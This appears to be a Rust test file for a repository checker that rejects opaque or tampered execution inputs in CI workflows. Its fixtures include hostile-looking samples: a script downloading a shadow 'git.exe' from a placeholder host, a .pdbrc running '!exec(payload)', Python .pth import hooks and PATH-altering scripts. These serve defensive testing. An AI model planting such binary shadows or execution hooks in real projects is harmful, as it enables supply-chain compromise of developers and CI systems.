use std::collections::BTreeSet;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::process::Command;

use sha2::{Digest, Sha256};

use super::{super::profile_policy::ProfileManifest, close_over_execution_inputs};
use super::{
    TRUSTED_MAINTAINABILITY_AUTHENTICATION, TRUSTED_MAINTAINABILITY_DISPATCH_LINE, TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE, TRUSTED_WORKFLOW, execution_inputs_for_surface,
    execution_surfaces, reviewed_generated_program, without_reviewed_protected_dispatch,
};

#[test]
fn arbitrary_pending_successors_do_not_bridge_opaque_dispatch() {
    let repository = tempfile::tempdir().expect("temporary repository");
    let path = "script/reviewed.sh";
    let source = "#!/bin/sh\nrunner=sh\n\"$runner\" --version\n";
    fs::create_dir(repository.path().join("script")).expect("create script directory");
    fs::write(repository.path().join(path), source).expect("write reviewed source");
    let current = format!("{:x}", Sha256::digest(source));
    let policy = |next: Option<&str>| {
        let next = next.map_or_else(|| "null".to_owned(), |digest| format!("\"{digest}\""));
        ProfileManifest::parse(
            format!(
                r#"{{"schema_version":1,"profiles":[{{"id":"reviewed","path":"{path}","current_sha256":"{current}","preapproved_next_sha256":{next},"retired_sha256":[],"issue":"https://example.invalid/1","rationale":"Replace legacy opaque dispatch.","safety_invariant":"Only the pinned current source may bridge to its exact successor."}}]}}"#
            )
            .as_bytes(),
        )
        .expect("profile manifest")
    };
    let tracked = BTreeSet::from([path.to_owned()]);

    let mut surfaces = tracked.clone();
    let error = close_over_execution_inputs(repository.path(), &mut surfaces, &tracked, &tracked, Some(&policy(None))).expect_err("reject unbridged opaque dispatch");
    assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");

    let mut surfaces = tracked.clone();
    let successor = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    let error = close_over_execution_inputs(repository.path(), &mut surfaces, &tracked, &tracked, Some(&policy(Some(successor)))).expect_err("reject arbitrary pending successor");
    assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
}

#[test]
fn protected_dispatch_requires_the_complete_canonical_authentication_sequence() {
    let reviewed =
        fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join("../../.github/workflows/trusted-maintainability.yml")).expect("read trusted maintainability workflow");
    let sanitized = without_reviewed_protected_dispatch(TRUSTED_WORKFLOW, &reviewed);
    assert!(!sanitized.contains(TRUSTED_MAINTAINABILITY_DISPATCH_LINE));
    assert!(!sanitized.contains(TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE));
    assert_eq!(sanitized.lines().filter(|line| line.trim() == ":").count(), 2);

    for changed in [
        reviewed.replacen("../.trusted-gate", "../.candidate", 1),
        reviewed.replacen("--maintainability", "--test-environment", 1),
        reviewed.replacen("/usr/bin/cygpath -u -- \"$GITHUB_WORKSPACE\"", "printf '%s' \"$GITHUB_WORKSPACE\"", 1),
        reviewed.replacen("$(git rev-parse", "$(/usr/bin/git rev-parse", 1),
        reviewed.replacen("$protected_root", "$audit_root", 1),
        reviewed.replacen("--dependency-unsafe", "--test-environment", 1),
        reviewed.replacen("runs-on: windows-latest", "runs-on: ubuntu-latest", 1),
        format!("{reviewed}\n          printf '%s\\n' \"$trusted_bootstrap\""),
        format!("{reviewed}\n          printf '%s\\n' \"$protected_bootstrap\""),
        reviewed.replacen(
            TRUSTED_MAINTAINABILITY_DISPATCH_LINE,
            &format!("          candidate_root=$workspace_root/decoy\n{TRUSTED_MAINTAINABILITY_DISPATCH_LINE}"),
            1,
        ),
        reviewed.replacen(
            TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE,
            &format!("          audit_root=$workspace_root/decoy\n{TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE}"),
            1,
        ),
        reviewed.replacen(
            &format!("{}\n{}", TRUSTED_MAINTAINABILITY_AUTHENTICATION[0], TRUSTED_MAINTAINABILITY_AUTHENTICATION[1]),
            &format!("{}\n{}", TRUSTED_MAINTAINABILITY_AUTHENTICATION[1], TRUSTED_MAINTAINABILITY_AUTHENTICATION[0]),
            1,
        ),
        reviewed.replacen(
            TRUSTED_MAINTAINABILITY_DISPATCH_LINE,
            &format!("          cargo test --workspace\n{TRUSTED_MAINTAINABILITY_DISPATCH_LINE}"),
            1,
        ),
        reviewed.replacen(
            TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE,
            &format!("          cargo test --workspace\n{TRUSTED_WINDOWS_DEPENDENCY_DISPATCH_LINE}"),
            1,
        ),
    ] {
        assert_eq!(without_reviewed_protected_dispatch(TRUSTED_WORKFLOW, &changed), changed);
    }
}

#[test]
fn unrelated_symlinks_are_not_command_surfaces() {
    let repository = tempfile::tempdir().expect("temporary repository");
    fs::create_dir(repository.path().join("docs")).expect("create docs directory");
    fs::create_dir(repository.path().join("script")).expect("create script directory");
    fs::create_dir(repository.path().join("src")).expect("create source directory");
    fs::write(repository.path().join("docs/guide.md"), "guide\n").expect("write guide");
    fs::write(repository.path().join("src/lib.rs"), "#![expect(missing_docs)]\npub fn value() {}\n").expect("write Rust inner attribute");
    symlink("guide.md", repository.path().join("docs/latest.md")).expect("create documentation symlink");
    fs::write(repository.path().join("script/check.sh"), "#!/bin/sh\nexit 0\n").expect("write command surface");
    git(repository.path(), &["init", "--quiet"]);
    git(repository.path(), &["add", "."]);

    let surfaces = execution_surfaces(repository.path()).expect("classify execution surfaces");
    assert!(surfaces.paths.contains(&"script/check.sh".to_owned()));
    assert!(!surfaces.paths.contains(&"docs/latest.md".to_owned()));
    assert!(!surfaces.paths.contains(&"src/lib.rs".to_owned()));

    symlink("check.sh", repository.path().join("script/linked.sh")).expect("create command symlink");
    git(repository.path(), &["add", "script/linked.sh"]);
    let error = execution_surfaces(repository.path()).err().expect("reject command surface symlink");
    assert!(error.to_string().contains("command execution surface cannot be a symlink"));
}

#[test]
fn tracked_rust_sources_cannot_be_executable() {
    let repository = tempfile::tempdir().expect("temporary repository");
    fs::write(repository.path().join("runner.rs"), "#!/bin/sh\nexit 0\n").expect("write executable Rust source");
    git(repository.path(), &["init", "--quiet"]);
    git(repository.path(), &["add", "."]);
    git(repository.path(), &["update-index", "--chmod=+x", "runner.rs"]);
    let error = execution_surfaces(repository.path()).err().expect("reject executable Rust source");
    assert!(error.to_string().contains("tracked Rust source cannot be executable"), "{error:#}");
}

#[test]
fn python_loadable_binary_bytecode_and_archive_artifacts_are_rejected() {
    for path in [
        "script/helper.pyc",
        "script/helper.pyo",
        "script/helper.PTH",
        "script/helper.pyd",
        "script/helper.cpython-313-x86_64-linux-gnu.so",
        "script/helper.zip",
        "script/helper.egg",
        "script/helper.whl",
        "script/helper.pyz",
        "script/helper.PyZw",
        "script/__pycache__/helper.txt",
    ] {
        let repository = tempfile::tempdir().expect("temporary repository");
        let target = repository.path().join(path);
        fs::create_dir_all(target.parent().expect("artifact parent")).expect("create artifact directory");
        fs::write(&target, b"opaque").expect("write Python-loadable artifact");
        git(repository.path(), &["init", "--quiet"]);
        git(repository.path(), &["add", "."]);

        let error = execution_surfaces(repository.path()).err().expect("reject Python-loadable artifact");
        assert!(error.to_string().contains("Python-loadable artifact is unsupported"), "{path}: {error:#}");
    }
}

#[test]
fn ignored_python_loadable_artifacts_are_rejected_outside_build_roots() {
    let repository = tempfile::tempdir().expect("temporary repository");
    git(repository.path(), &["init", "--quiet"]);
    fs::create_dir_all(repository.path().join("script")).expect("create script directory");
    fs::create_dir_all(repository.path().join("target")).expect("create build directory");
    fs::write(repository.path().join(".git/info/exclude"), "script/helper.pyc\nscript/helper.pth\ntarget/\n").expect("local Git exclusions");
    fs::write(repository.path().join("script/helper.pyc"), b"opaque").expect("ignored Python artifact");
    fs::write(repository.path().join("script/helper.pth"), b"import subprocess").expect("ignored Python path configuration");
    fs::write(repository.path().join("target/generated.pyc"), b"generated").expect("ignored build artifact");

    let error = execution_surfaces(repository.path()).err().expect("reject ignored Python-loadable artifact");
    assert!(error.to_string().contains("script/helper.pth"), "{error:#}");
    fs::remove_file(repository.path().join("script/helper.pth")).expect("remove Python path configuration");
    let error = execution_surfaces(repository.path()).err().expect("reject ignored Python bytecode");
    assert!(error.to_string().contains("script/helper.pyc"), "{error:#}");
    fs::remove_file(repository.path().join("script/helper.pyc")).expect("remove Python bytecode");
    execution_surfaces(repository.path()).expect("exclude governed build output");
}

#[test]
fn untracked_python_path_configuration_is_rejected() {
    let repository = tempfile::tempdir().expect("temporary repository");
    git(repository.path(), &["init", "--quiet"]);
    fs::create_dir_all(repository.path().join("quality")).expect("create quality directory");
    fs::write(repository.path().join("quality/paths.pth"), b"quality/vendor\n").expect("untracked Python path configuration");

    let error = execution_surfaces(repository.path()).err().expect("reject untracked Python path configuration");
    assert!(error.to_string().contains("quality/paths.pth"), "{error:#}");
}

#[test]
fn python_debugger_commands_are_rejected_across_git_states() {
    for state in ["tracked", "untracked", "ignored"] {
        let repository = tempfile::tempdir().expect("temporary repository");
        git(repository.path(), &["init", "--quiet"]);
        if state == "ignored" {
            fs::write(repository.path().join(".git/info/exclude"), ".pdbrc\n").expect("ignore debugger commands");
        }
        fs::write(repository.path().join(".pdbrc"), b"!exec(payload)\ncontinue\n").expect("Python debugger commands");
        if state == "tracked" {
            git(repository.path(), &["add", ".pdbrc"]);
        }

        let error = execution_surfaces(repository.path()).err().expect("reject Python debugger commands");
        assert!(error.to_string().contains(".pdbrc"), "{state}: {error:#}");
    }
}

#[test]
fn python_bare_programs_reject_tracked_and_untracked_windows_workspace_shadows() {
    let repository = tempfile::tempdir().expect("temporary repository");
    fs::create_dir(repository.path().join("script")).expect("create script directory");
    fs::write(
        repository.path().join("script/check.py"),
        "#!/usr/bin/env python3\nimport subprocess\nsubprocess.run(['git', 'rev-parse', '--verify', 'HEAD'], check=True)\n",
    )
    .expect("write Python command surface");
    git(repository.path(), &["init", "--quiet"]);
    git(repository.path(), &["add", "."]);
    fs::write(
        repository.path().join("script/run.sh"),
        "#!/bin/sh\ncurl -o git.exe https://example.invalid/git.exe\npython script/check.py\n",
    )
    .expect("write generator");
    git(repository.path(), &["add", "script/run.sh"]);
    let error = execution_surfaces(repository.path()).err().expect("reject generated Windows shadow");
    assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
    fs::remove_file(repository.path().join("script/run.sh")).expect("remove generator");
    fs::write(repository.path().join("GIT.EXE"), "opaque\n").expect("write untracked Windows shadow");

    let error = execution_surfaces(repository.path()).err().expect("reject untracked Windows shadow");
    assert!(error.to_string().contains("outside the tracked path inventory"), "{error:#}");

    fs::write(repository.path().join(".git/info/exclude"), "GIT.EXE\n").expect("ignore Windows shadow");
    let error = execution_surfaces(repository.path()).err().expect("reject ignored Windows shadow");
    assert!(error.to_string().contains("outside the tracked path inventory"), "{error:#}");
    fs::write(repository.path().join(".git/info/exclude"), "").expect("clear local Git exclusion");
    git(repository.path(), &["add", "GIT.EXE"]);
    let error = execution_surfaces(repository.path()).err().expect("reject Windows shadow");
    assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
}

#[test]
fn unsupported_executable_formats_fail_closed() {
    for executable in [false, true] {
        let repository = tempfile::tempdir().expect("temporary repository");
        fs::create_dir(repository.path().join("quality")).expect("create quality directory");
        let source = if executable { "cp source clippy.toml\n" } else { "#!/bin/sh\ncp source clippy.toml\n" };
        fs::write(repository.path().join("quality/runner.json"), source).expect("write unsupported command surface");
        git(repository.path(), &["init", "--quiet"]);
        git(repository.path(), &["add", "."]);
        if executable {
            git(repository.path(), &["update-index", "--chmod=+x", "quality/runner.json"]);
        }

        let error = execution_surfaces(repository.path()).err().expect("reject unsupported command surface");
        assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
    }
}

#[test]
fn python_bare_programs_reject_ambient_resolution_mutation() {
    for mutation in [r#"os.chdir("quality")"#, r#"os.environ["Path"] = "quality"#] {
        let repository = tempfile::tempdir().expect("temporary repository");
        fs::create_dir_all(repository.path().join("script")).expect("create script directory");
        fs::create_dir_all(repository.path().join("quality")).expect("create shadow directory");
        fs::write(
            repository.path().join("script/check.py"),
            format!("#!/usr/bin/env python3\nimport os, subprocess\n{mutation}\nsubprocess.run(['git', 'rev-parse', '--verify', 'HEAD'], check=True)\n"),
        )
        .expect("write Python command surface");
        fs::write(repository.path().join("quality/GIT.EXE"), "#!/bin/sh\nexit 0\n").expect("write Windows shadow");
        git(repository.path(), &["init", "--quiet"]);
        git(repository.path(), &["add", "."]);

        let error = execution_surfaces(repository.path()).err().expect("reject ambient bare-program resolution");
        assert!(error.to_string().contains("opaque interpreter program"), "{mutation}: {error:#}");
    }
}

#[test]
fn python_interpreters_reject_ambient_environment_mutation() {
    let repository = tempfile::tempdir().expect("temporary repository");
    fs::create_dir_all(repository.path().join("script")).expect("create script directory");
    fs::write(repository.path().join("script/child.py"), "print('child')\n").expect("write child script");
    fs::write(
        repository.path().join("script/check.py"),
        "#!/usr/bin/env python3\nimport os, subprocess, sys\nos.environ.update(load_configuration())\nsubprocess.run([sys.executable, 'script/child.py'], check=True)\n",
    )
    .expect("write Python command surface");
    git(repository.path(), &["init", "--quiet"]);
    git(repository.path(), &["add", "."]);

    let error = execution_surfaces(repository.path()).err().expect("reject ambient interpreter environment");
    assert!(error.to_string().contains("opaque interpreter program"), "{error:#}");
}

#[test]
fn generated_release_smoke_programs_have_a_closed_invocation_set() {
    const PATH: &str = ".github/workflows/release.yml";
    let reviewed = r"name: release
jobs:
  smoke:
runs-on: windows-latest
steps:
  - shell: pwsh
    run: |
      Copy-Item -LiteralPath $binary -Destination ./hold-smoke.exe
      $actual = ./hold-smoke.exe --version
      ./hold-smoke.exe --help | Out-Null
";
    let inputs = execution_inputs_for_surface(PATH, reviewed, true);
    assert!(!inputs.unresolved, "exact generated smoke program");
    assert_eq!(inputs.paths, BTreeSet::from(["hold-smoke.exe".to_owned()]));
    assert!(reviewed_generated_program(PATH, reviewed, "hold-smoke.exe"));

    let changed = format!("{reviewed}          ./hold-smoke.exe --version\n");
    assert!(!reviewed_generated_program(PATH, &changed, "hold-smoke.exe"));
}

#[test]
fn generated_ci_smoke_program_has_a_closed_invocation_set() {
    let reviewed = r"Copy-Item -LiteralPath $binary -Destination ./hold-smoke.exe
./hold-smoke.exe --version
./hold-smoke.exe --help | Out-Null
";
    assert!(super::reviewed_generated_program(".github/workflows/ci.yml", reviewed, "hold-smoke.exe"));
    assert!(!super::reviewed_generated_program(
        ".github/workflows/ci.yml",
        &format!("{reviewed}./hold-smoke.exe --version\n"),
        "hold-smoke.exe"
    ));
}

fn git(repository: &Path, arguments: &[&str]) {
    let status = Command::new("git")
        .current_dir(repository)
        .args(["-c", "core.fsmonitor=false", "-c", "core.hooksPath=/dev/null"])
        .args(arguments)
        .status()
        .expect("run git");
    assert!(status.success(), "git {arguments:?}");
}
